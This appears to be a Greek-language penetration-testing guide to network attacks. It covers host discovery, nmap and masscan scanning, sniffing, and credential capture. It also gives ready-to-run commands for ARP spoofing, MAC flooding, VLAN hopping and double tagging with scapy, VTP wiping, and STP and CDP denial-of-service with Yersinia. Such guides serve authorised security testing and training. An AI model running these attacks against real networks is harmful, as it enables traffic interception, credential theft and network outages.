# Pentesting Network

{{#include ../../banners/hacktricks-training.md}}



## Ανακάλυψη hosts από το εξωτερικό

Αυτή θα είναι μια **σύντομη ενότητα** για το πώς να βρείτε **IPs που ανταποκρίνονται** από το **Διαδίκτυο**.\
Σε αυτή την περίπτωση έχετε κάποιο **εύρος IPs** (ίσως ακόμα και αρκετά **ranges**) και απλώς θέλετε να βρείτε **ποια IPs ανταποκρίνονται**.

### ICMP

Αυτή είναι η **πιο εύκολη** και **πιο γρήγορη** μέθοδος για να ανακαλύψετε αν ένας host είναι up ή όχι.\
Μπορείτε να προσπαθήσετε να στείλετε κάποια **ICMP** πακέτα και να **περιμένετε απαντήσεις**. Ο ευκολότερος τρόπος είναι απλώς να στείλετε ένα **echo request** και να περιμένετε την απάντηση. Μπορείτε να το κάνετε χρησιμοποιώντας ένα απλό `ping` ή το `fping` για **ranges**.\
Μπορείτε επίσης να χρησιμοποιήσετε **nmap** για να στείλετε άλλους τύπους πακέτων **ICMP** (αυτό θα αποφύγει φίλτρα στα κοινά ICMP echo request-response).
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### TCP Port Discovery

Είναι πολύ συνηθισμένο να διαπιστώσετε ότι όλα τα είδη πακέτων ICMP φιλτράρονται. Τότε, το μόνο που μπορείτε να κάνετε για να ελέγξετε αν ένας host είναι up είναι να **try to find open ports**. Κάθε host έχει **65535 ports**, οπότε, αν έχετε ένα "big" scope **δεν μπορείτε** να ελέγξετε αν **each port** κάθε host είναι open ή όχι, αυτό θα πάρει πάρα πολύ χρόνο.\
Άρα, αυτό που χρειάζεστε είναι ένας **fast port scanner** ([masscan](https://github.com/robertdavidgraham/masscan)) και μια λίστα με τις **ports more used:**
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
Μπορείτε επίσης να εκτελέσετε αυτό το βήμα με `nmap`, αλλά είναι πιο αργό και το `nmap` έχει προβλήματα στον εντοπισμό hosts που είναι up.

### Ανακάλυψη θυρών HTTP

Αυτή είναι απλώς μια ανακάλυψη θυρών TCP χρήσιμη όταν θέλετε να **επικεντρωθείτε στην ανακάλυψη HTTP** **services**:
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### UDP Port Discovery

Μπορείτε επίσης να δοκιμάσετε να ελέγξετε αν υπάρχει κάποια **UDP port open** για να αποφασίσετε αν πρέπει να **δώσετε περισσότερη προσοχή** σε έναν **host.**

Επειδή οι UDP services συνήθως **δεν ανταποκρίνονται** με **κανένα δεδομένο** σε ένα κανονικό κενό UDP probe packet, είναι δύσκολο να πεις αν ένα port είναι filtered ή open.

Ο πιο εύκολος τρόπος να το αποφασίσετε είναι να στείλετε ένα packet σχετικό με την υπηρεσία που τρέχει, και επειδή δεν ξέρετε ποια service τρέχει, θα πρέπει να δοκιμάσετε τα πιο πιθανά με βάση τον αριθμό του port:
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
Η γραμμή nmap που προτάθηκε παραπάνω θα δοκιμάσει τα **top 1000 UDP ports** σε κάθε host μέσα στο **/24** εύρος, αλλά ακόμα και αυτό θα πάρει **>20min**. Αν χρειάζεστε **ταχύτερα αποτελέσματα** μπορείτε να χρησιμοποιήσετε [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner): `./udp-proto-scanner.pl 199.66.11.53/24` Αυτό θα στείλει αυτά τα **UDP probes** στις **αναμενόμενες θύρες** τους (για ένα /24 εύρος αυτό θα πάρει μόλις 1 min): _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### SCTP Port Discovery
```bash
#Probably useless, but it's pretty fast, why not try it?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Pentesting Wifi

Εδώ θα βρείτε έναν καλό οδηγό για όλα τα γνωστά Wifi attacks κατά την ημερομηνία συγγραφής:


{{#ref}}
../pentesting-wifi/
{{#endref}}

## Ανακάλυψη hosts από το εσωτερικό

Εάν βρίσκεστε μέσα στο network, ένα από τα πρώτα πράγματα που θα θελήσετε να κάνετε είναι να **ανακαλύψετε άλλους hosts**. Ανάλογα με **πόσο θόρυβο** μπορείτε/θέλετε να προκαλέσετε, μπορούν να γίνουν διαφορετικές ενέργειες:

### Παθητικό

Μπορείτε να χρησιμοποιήσετε αυτά τα εργαλεία για να ανακαλύψετε παθητικά hosts μέσα σε ένα συνδεδεμένο network:
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### Ενεργό

Σημειώστε ότι οι τεχνικές που σχολιάζονται στο [_**Discovering hosts from the outside**_](#discovering-hosts-from-the-outside) (_TCP/HTTP/UDP/SCTP Port Discovery_) μπορούν επίσης να **εφαρμοστούν εδώ**.\
Αλλά, καθώς βρίσκεστε στο **ίδιο δίκτυο** με τα άλλα hosts, μπορείτε να κάνετε **περισσότερα**:
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### Active ICMP

Σημειώστε ότι οι τεχνικές που σχολιάζονται στο _Discovering hosts from the outside_ ([_**ICMP**_](#icmp)) μπορούν επίσης να **εφαρμοστούν εδώ**.\
Αλλά, καθώς βρίσκεστε στο **ίδιο δίκτυο** με τους άλλους hosts, μπορείτε να κάνετε **περισσότερα**:

- Αν κάνετε **ping** σε μια **subnet broadcast address**, το ping θα πρέπει να φτάσει σε **κάθε host** και αυτοί θα μπορούσαν να **απαντήσουν σε εσάς**: `ping -b 10.10.5.255`
- Κάνοντας **ping** στη **network broadcast address** μπορείτε ακόμη και να βρείτε **hosts** μέσα σε **άλλα subnets**: `ping -b 255.255.255.255`
- Χρησιμοποιήστε τις σημαίες `-PE`, `-PP`, `-PM` του `nmap` για να πραγματοποιήσετε host discovery στέλνοντας αντίστοιχα **ICMPv4 echo**, **timestamp**, και **subnet mask requests:** `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lan χρησιμοποιείται για να **ενεργοποιήσει** υπολογιστές μέσω ενός **network message**. Το magic packet που χρησιμοποιείται για να ενεργοποιήσει τον υπολογιστή είναι απλά ένα packet όπου παρέχεται ένα **MAC Dst** και στη συνέχεια αυτό **επαναλαμβάνεται 16 φορές** μέσα στο ίδιο packet.\
Αυτό το είδος packets συνήθως αποστέλλεται σε ένα **ethernet 0x0842** ή σε ένα **UDP packet to port 9**.\
Αν **no \[MAC]** παρέχεται, το packet αποστέλλεται σε **broadcast ethernet** (και το broadcast MAC θα είναι το ένα που επαναλαμβάνεται).
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0842
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## Σάρωση Hosts

Μόλις εντοπίσετε όλες τις IPs (εξωτερικές ή εσωτερικές) που θέλετε να σαρώσετε σε βάθος, μπορούν να εκτελεστούν διάφορες ενέργειες.

### TCP

- **Ανοιχτή** port: _SYN --> SYN/ACK --> RST_
- **Κλειστή** port: _SYN --> RST/ACK_
- **Φιλτραρισμένη** port: _SYN --> \[NO RESPONSE]_
- **Φιλτραρισμένη** port: _SYN --> ICMP message_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

Υπάρχουν 2 επιλογές για να σαρώσετε μια θύρα UDP:

- Στείλτε ένα **UDP packet** και ελέγξτε για την απάντηση _**ICMP unreachable**_ αν η θύρα είναι **closed** (σε αρκετές περιπτώσεις το ICMP θα είναι **filtered**, οπότε δεν θα λάβετε καμία πληροφορία εάν η θύρα είναι **closed** ή **open**).
- Στείλτε **formatted datagrams** για να προκαλέσετε μια απάντηση από μια **service** (π.χ., DNS, DHCP, TFTP και άλλες, όπως αναφέρονται στο _nmap-payloads_). Αν λάβετε μια **response**, τότε η θύρα είναι **open**.

**Nmap** θα **mix both** τις επιλογές χρησιμοποιώντας "-sV" (UDP scans are very slow), αλλά σημειώστε ότι οι UDP scans είναι πιο αργές από τις TCP scans:
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTP Scan

**SCTP (Stream Control Transmission Protocol)** έχει σχεδιαστεί για να χρησιμοποιείται παράλληλα με **TCP (Transmission Control Protocol)** και **UDP (User Datagram Protocol)**. Ο κύριος σκοπός του είναι να διευκολύνει τη μεταφορά δεδομένων τηλεφωνίας πάνω σε IP δίκτυα, αντικατοπτρίζοντας πολλές από τις λειτουργίες αξιοπιστίας που βρίσκονται στο **Signaling System 7 (SS7)**. **SCTP** είναι βασικό στοιχείο της οικογένειας πρωτοκόλλων **SIGTRAN**, η οποία στοχεύει στη μεταφορά σημάτων SS7 πάνω σε IP δίκτυα.

Η υποστήριξη για **SCTP** παρέχεται από διάφορα λειτουργικά συστήματα, όπως **IBM AIX**, **Oracle Solaris**, **HP-UX**, **Linux**, **Cisco IOS**, και **VxWorks**, υποδεικνύοντας την ευρεία αποδοχή και τη χρησιμότητά του στον τομέα των τηλεπικοινωνιών και των δικτύων.

Το **nmap** προσφέρει δύο διαφορετικές scans για **SCTP**: _-sY_ και _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### IDS and IPS evasion


{{#ref}}
ids-evasion.md
{{#endref}}

### **Περισσότερες επιλογές nmap**


{{#ref}}
nmap-summary-esp.md
{{#endref}}

### Αποκάλυψη εσωτερικών IP Addresses

Οι λανθασμένα ρυθμισμένοι routers, firewalls και network devices μερικές φορές ανταποκρίνονται σε network probes χρησιμοποιώντας nonpublic source addresses. Το tcpdump μπορεί να χρησιμοποιηθεί για να εντοπίσει packets που λαμβάνονται από private addresses κατά τη διάρκεια των δοκιμών. Συγκεκριμένα, σε Kali Linux, τα packets μπορούν να καταγραφούν στην eth2 interface, η οποία είναι προσβάσιμη από το public Internet. Είναι σημαντικό να σημειωθεί ότι αν το setup σας βρίσκεται πίσω από ένα NAT ή ένα Firewall, τέτοια packets πιθανότατα θα φιλτραριστούν έξω.
```bash
tcpdump –nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## Sniffing

Με το Sniffing μπορείτε να μάθετε λεπτομέρειες για IP ranges, subnet sizes, MAC addresses και hostnames εξετάζοντας captured frames και packets. Εάν το network είναι misconfigured ή το switching fabric υπό φόρτο, οι επιτιθέμενοι μπορούν να καταγράψουν ευαίσθητο υλικό μέσω passive network sniffing.

Εάν ένα switched Ethernet network είναι σωστά configured, θα βλέπετε μόνο broadcast frames και υλικό που προορίζεται για τη MAC address σας.

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
Επίσης, μπορεί κανείς να καταγράψει πακέτα από μια απομακρυσμένη μηχανή μέσω μιας συνεδρίας SSH χρησιμοποιώντας το Wireshark ως GUI σε πραγματικό χρόνο.
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

Προφανώς.

### Capturing credentials

Μπορείτε να χρησιμοποιήσετε εργαλεία όπως [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) για να εξάγετε credentials από ένα pcap ή από ένα live interface.

## Επιθέσεις LAN

### ARP spoofing

Το ARP Spoofing συνίσταται στην αποστολή gratuitous ARPResponses για να υποδείξουμε ότι η IP ενός μηχανήματος αντιστοιχεί στο MAC της συσκευής μας. Έπειτα, το θύμα θα αλλάξει τον ARP πίνακα και θα επικοινωνεί με τη συσκευή μας κάθε φορά που θέλει να επικοινωνήσει με την spoofed IP.

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - CAM overflow

Πλημμυρίστε τον CAM table του switch στέλνοντας πολλά πακέτα με διαφορετικές source mac address. Όταν ο CAM table γεμίσει, το switch αρχίζει να συμπεριφέρεται σαν hub (αναμεταδίδοντας όλη την κίνηση).
```bash
macof -i <interface>
```
Σε σύγχρονα switches αυτή η ευπάθεια έχει διορθωθεί.

### 802.1Q VLAN / DTP Επιθέσεις

#### Dynamic Trunking

Το **Dynamic Trunking Protocol (DTP)** έχει σχεδιαστεί ως πρωτόκολλο επιπέδου σύνδεσης για να διευκολύνει ένα αυτόματο σύστημα για το trunking, επιτρέποντας στα switches να επιλέγουν αυτόματα θύρες για λειτουργία trunk (Trunk) ή μη-trunk mode. Η ενεργοποίηση του **DTP** συχνά θεωρείται ένδειξη υποβέλτιστου σχεδιασμού δικτύου, υπογραμμίζοντας τη σημασία της χειροκίνητης διαμόρφωσης trunks μόνο όπου είναι απαραίτητο και της σωστής τεκμηρίωσης.

Συνήθως οι θύρες των switches είναι ρυθμισμένες να λειτουργούν σε Dynamic Auto mode, που σημαίνει ότι είναι έτοιμες να ξεκινήσουν trunking αν ενεργοποιηθούν από γειτονικό switch. Προκύπτει ζήτημα ασφαλείας όταν ένας pentester ή επιτιθέμενος συνδέεται στο switch και αποστέλλει ένα DTP Desirable frame, αναγκάζοντας τη θύρα να μπει σε trunk mode. Αυτή η ενέργεια επιτρέπει στον επιτιθέμενο να απαριθμήσει τα VLAN μέσω ανάλυσης STP frames και να παρακάμψει τον διαμερισμό VLAN δημιουργώντας virtual interfaces.

Η παρουσία του DTP σε πολλά switches εξ ορισμού μπορεί να αξιοποιηθεί από αντιπάλους για να μιμηθούν τη συμπεριφορά ενός switch, αποκτώντας έτσι πρόσβαση στην κίνηση σε όλα τα VLAN. Το script [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) χρησιμοποιείται για την παρακολούθηση μιας διεπαφής, αποκαλύπτοντας αν ένα switch βρίσκεται σε Default, Trunk, Dynamic, Auto ή Access mode — με το τελευταίο να είναι η μόνη ρύθμιση ανθεκτική σε VLAN hopping attacks. Αυτό το εργαλείο αξιολογεί την κατάσταση ευπάθειας του switch.

Εάν εντοπιστεί ευπάθεια στο δίκτυο, το εργαλείο _**Yersinia**_ μπορεί να χρησιμοποιηθεί για να "enable trunking" μέσω του πρωτοκόλλου DTP, επιτρέποντας την παρακολούθηση πακέτων από όλα τα VLANs.
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../images/image (269).png>)

Για να απαριθμήσετε τα VLANs, είναι επίσης δυνατό να δημιουργήσετε το DTP Desirable frame με το script [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py). Μην διακόψετε το script υπό οποιεσδήποτε συνθήκες. Εγχέει το DTP Desirable κάθε τρία δευτερόλεπτα. **Τα δυναμικά δημιουργημένα trunk channels στο switch διαρκούν μόνο πέντε λεπτά. Μετά από πέντε λεπτά, το trunk πέφτει.**
```
sudo python3 DTPHijacking.py --interface eth0
```
Θα ήθελα να επισημάνω ότι **Access/Desirable (0x03)** υποδεικνύει ότι το DTP frame είναι του τύπου Desirable, το οποίο δίνει εντολή στη θύρα να μεταβεί σε Trunk mode. Και **802.1Q/802.1Q (0xa5** υποδεικνύει τον τύπο encapsulation **802.1Q**.

Αναλύοντας τα STP frames, **μαθαίνουμε για την ύπαρξη των VLAN 30 και VLAN 60.**

<figure><img src="../../images/image (124).png" alt=""><figcaption></figcaption></figure>

#### Επίθεση σε συγκεκριμένα VLANs

Μόλις γνωρίζετε τα VLAN IDs και τις τιμές IP, μπορείτε να **διαμορφώσετε μια εικονική διεπαφή για να επιτεθείτε σε ένα συγκεκριμένο VLAN**.\
Εάν το DHCP δεν είναι διαθέσιμο, τότε χρησιμοποιήστε _ifconfig_ για να ορίσετε μια στατική διεύθυνση IP.
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### Automatic VLAN Hopper

Η επίθεση που συζητήθηκε με **Dynamic Trunking και δημιουργία virtual interfaces και ανακάλυψη hosts εντός** άλλων VLANs εκτελείται **αυτόματα** από το εργαλείο: [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### Double Tagging

Εάν ένας attacker γνωρίζει την τιμή του **MAC, IP and VLAN ID of the victim host**, θα μπορούσε να προσπαθήσει να **double tag a frame** με το ορισμένο VLAN του και το VLAN του victim και να στείλει ένα πακέτο. Δεδομένου ότι ο **victim won't be able to connect back** με τον attacker, η **best option for the attacker is communicate via UDP** είναι να χρησιμοποιήσει πρωτόκολλα που μπορούν να εκτελέσουν ενδιαφέρουσες ενέργειες (όπως SNMP).

Μια άλλη επιλογή για τον attacker είναι να ξεκινήσει ένα **TCP port scan spoofing an IP controlled by the attacker and accessible by the victim** (πιθανώς μέσω internet). Στη συνέχεια, ο attacker θα μπορούσε να sniff στο δεύτερο host που του ανήκει αν λάβει κάποια πακέτα από τον victim.

![](<../../images/image (190).png>)

Για να εκτελέσετε αυτή την επίθεση μπορείτε να χρησιμοποιήσετε το scapy: `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Πλευρική παράκαμψη διαχωρισμού VLAN <a href="#d679" id="d679"></a>

Αν έχετε **πρόσβαση σε ένα switch στο οποίο είστε απευθείας συνδεδεμένοι**, έχετε τη δυνατότητα να **παρακάμψετε τον διαχωρισμό VLAN** εντός του δικτύου. Απλά **αλλάξτε την πόρτα σε trunk mode** (γνωστή και ως trunk), δημιουργήστε virtual interfaces με τα IDs των στοχευόμενων VLAN και διαμορφώστε μια διεύθυνση IP. Μπορείτε να προσπαθήσετε να ζητήσετε τη διεύθυνση δυναμικά (DHCP) ή να τη ρυθμίσετε στατικά. Εξαρτάται από την περίπτωση.


{{#ref}}
lateral-vlan-segmentation-bypass.md
{{#endref}}

#### Παράκαμψη Private VLAN επιπέδου 3

Σε ορισμένα περιβάλλοντα, όπως δίκτυα guest ασύρματου δικτύου, εφαρμόζονται ρυθμίσεις **port isolation (γνωστές και ως private VLAN)** για να αποτρέπεται η άμεση επικοινωνία των clients που είναι συνδεδεμένοι σε ένα wireless access point μεταξύ τους. Ωστόσο, έχει εντοπιστεί μια τεχνική που μπορεί να παρακάμψει αυτά τα μέτρα απομόνωσης. Η τεχνική αυτή εκμεταλλεύεται είτε την απουσία δικτυακών ACLs είτε την εσφαλμένη τους διαμόρφωση, επιτρέποντας τη δρομολόγηση IP πακέτων μέσω ενός router για να φτάσουν σε έναν άλλο client στο ίδιο δίκτυο.

Η επίθεση εκτελείται δημιουργώντας ένα **packet που φέρει τη διεύθυνση IP του προοριζόμενου client αλλά με τη MAC address του router**. Αυτό κάνει το router να προωθήσει λανθασμένα το packet προς τον στόχο. Αυτή η προσέγγιση είναι παρόμοια με αυτή που χρησιμοποιείται σε Double Tagging Attacks, όπου η δυνατότητα ελέγχου ενός host που είναι προσβάσιμος από το θύμα χρησιμοποιείται για την εκμετάλλευση του σφάλματος ασφαλείας.

Βασικά Βήματα της Επίθεσης:

1. Σύνθεση Πακέτου: Δημιουργείται ειδικά ένα πακέτο που περιλαμβάνει τη διεύθυνση IP του στοχευόμενου client αλλά με τη MAC address του router.
2. Εκμετάλλευση Συμπεριφοράς Router: Το συντεθειμένο πακέτο στέλνεται προς το router, το οποίο, λόγω της διαμόρφωσης, αναδρομολογεί το πακέτο στον στοχευόμενο client, παρακάμπτοντας την απομόνωση που παρέχουν οι ρυθμίσεις private VLAN.

### VTP Attacks

Το VTP (VLAN Trunking Protocol) κεντροποιεί τη διαχείριση των VLAN. Χρησιμοποιεί revision numbers για τη διατήρηση της ακεραιότητας της VLAN database· κάθε τροποποίηση αυξάνει αυτόν τον αριθμό. Τα switches υιοθετούν διαμορφώσεις με μεγαλύτερους αριθμούς revision, ενημερώνοντας τη δική τους VLAN database.

#### VTP Domain Roles

- **VTP Server:** Διαχειρίζεται VLAN—δημιουργεί, διαγράφει, τροποποιεί. Εκπέμπει VTP announcements στα μέλη του domain.
- **VTP Client:** Λαμβάνει VTP announcements για να συγχρονίσει τη VLAN database του. Αυτός ο ρόλος δεν επιτρέπει τοπικές αλλαγές στη διαμόρφωση VLAN.
- **VTP Transparent:** Δεν συμμετέχει σε VTP updates αλλά προωθεί VTP announcements. Δεν επηρεάζεται από VTP attacks και διατηρεί σταθερό revision number μηδέν.

#### VTP Advertisement Types

- **Summary Advertisement:** Εκπέμπεται από τον VTP server κάθε 300 δευτερόλεπτα και περιέχει βασικές πληροφορίες για το domain.
- **Subset Advertisement:** Αποστέλλεται μετά από αλλαγές στη διαμόρφωση VLAN.
- **Advertisement Request:** Εκδίδεται από έναν VTP client για να ζητήσει ένα Summary Advertisement, συνήθως όταν ανιχνεύει υψηλότερο configuration revision number.

Οι ευπάθειες του VTP είναι εκμεταλλεύσιμες αποκλειστικά μέσω trunk ports, καθώς τα VTP announcements κυκλοφορούν μόνο μέσω αυτών. Σε σενάρια μετά από DTP attacks, οι επιθέσεις μπορεί να στραφούν προς το VTP. Εργαλεία όπως το Yersinia μπορούν να διευκολύνουν επιθέσεις VTP, στοχεύοντας στο wipe out της VLAN database, διαταράσσοντας ουσιαστικά το δίκτυο.

Σημείωση: Αυτή η συζήτηση αναφέρεται στην έκδοση VTP 1 (VTPv1).
```bash
yersinia -G # Launch Yersinia in graphical mode
```
Στη γραφική λειτουργία του Yersinia, επιλέξτε την επιλογή deleting all VTP vlans για να καθαρίσετε τη VLAN database.

### STP Attacks

**Εάν δεν μπορείτε να καταγράψετε πλαίσια BPDU στις διεπαφές σας, είναι απίθανο να πετύχετε σε STP attack.**

#### **STP BPDU DoS**

Η αποστολή μεγάλου όγκου BPDUs TCP (Topology Change Notification) ή Conf (τα BPDUs που αποστέλλονται όταν δημιουργείται η τοπολογία) υπερφορτώνει τους switches, οι οποίοι σταματούν να λειτουργούν σωστά.
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **STP TCP Attack**

Όταν αποστέλλεται ένα TCP, ο CAM table των switches θα διαγραφεί σε 15s. Έπειτα, αν στέλνετε συνεχώς αυτό το είδος packets, ο CAM table θα επανεκκινείται συνεχώς (ή κάθε 15segs) και όταν επανεκκινείται, ο switch συμπεριφέρεται ως hub.
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **STP Root Attack**

Ο επιτιθέμενος μιμείται τη συμπεριφορά ενός switch για να γίνει ο STP root του δικτύου. Στη συνέχεια, περισσότερα δεδομένα θα περάσουν μέσω αυτού. Αυτό είναι ενδιαφέρον όταν είσαι συνδεδεμένος σε δύο διαφορετικά switches.\
Αυτό γίνεται στέλνοντας BPDUs CONF packets που δηλώνουν ότι η τιμή της **priority** είναι μικρότερη από την πραγματική τιμή της πραγματικής root switch.
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**Εάν ο attacker είναι συνδεδεμένος με 2 switches, μπορεί να γίνει root του νέου tree και όλη η traffic μεταξύ αυτών των switches θα περάσει μέσω αυτού (θα πραγματοποιηθεί MITM attack).**
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### CDP Επιθέσεις

CISCO Discovery Protocol (CDP) είναι απαραίτητο για την επικοινωνία μεταξύ συσκευών CISCO, επιτρέποντάς τους να **αναγνωρίζουν η μία την άλλη και να μοιράζονται πληροφορίες διαμόρφωσης**.

#### Παθητική Συλλογή Δεδομένων <a href="#id-0e0f" id="id-0e0f"></a>

Το CDP έχει ρυθμιστεί να εκπέμπει πληροφορίες μέσω όλων των θυρών, κάτι που μπορεί να οδηγήσει σε κίνδυνο ασφαλείας. Ένας επιτιθέμενος, αφού συνδεθεί σε μια θύρα switch, μπορεί να αναπτύξει network sniffers όπως **Wireshark**, **tcpdump**, ή **Yersinia**. Αυτή η ενέργεια μπορεί να αποκαλύψει ευαίσθητα δεδομένα για τη συσκευή δικτύου, συμπεριλαμβανομένου του μοντέλου και της έκδοσης του Cisco IOS που τρέχει. Ο επιτιθέμενος μπορεί τότε να στοχεύσει συγκεκριμένες ευπάθειες στην εντοπισμένη έκδοση του Cisco IOS.

#### Προκαλώντας Πλημμύρα Πίνακα CDP <a href="#id-0d6a" id="id-0d6a"></a>

Μια πιο επιθετική προσέγγιση περιλαμβάνει την εκτέλεση μιας επίθεσης Denial of Service (DoS) υπερφορτώνοντας τη μνήμη του switch, προσποιούμενη νόμιμες συσκευές CISCO. Παρακάτω βρίσκεται η ακολουθία εντολών για την εκκίνηση μιας τέτοιας επίθεσης χρησιμοποιώντας το Yersinia, ένα εργαλείο δικτύου σχεδιασμένο για δοκιμές:
```bash
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```
